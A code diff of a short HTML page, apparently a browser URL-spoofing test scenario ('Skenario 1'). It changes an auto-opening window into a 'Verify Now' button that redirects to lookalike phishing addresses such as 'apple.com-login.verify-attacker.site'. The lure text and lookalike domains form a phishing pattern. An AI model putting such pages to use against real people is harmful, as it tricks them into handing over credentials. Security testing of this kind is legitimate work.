@@ -1,14 +1,18 @@
 <!DOCTYPE html>
 <html>
-<head><title>Skenario 1: Domain Bar Spoof</title></head>
+<head><title>Skenario 1: Long Subdomain Spoof (Fixed)</title></head>
 <body>
-  <h2>Launching Spoofed Subdomain...</h2>
+  <h2>Click below to verify your identity</h2>
+  <button onclick="openSpoof()">Verify Now</button>
+
   <script>
-    const fakeURL = "https://apple.com-login.secure.attacker-site.com";
-    const w = window.open();
-    setTimeout(() => {
-      w.location.href = fakeURL;
-    }, 500);
+    function openSpoof() {
+      const spoofURL = "https://apple.com-login.verify-attacker.site";
+      const win = window.open("about:blank", "_blank");
+      setTimeout(() => {
+        win.location.href = spoofURL;
+      }, 500);
+    }
   </script>
 </body>
 </html>
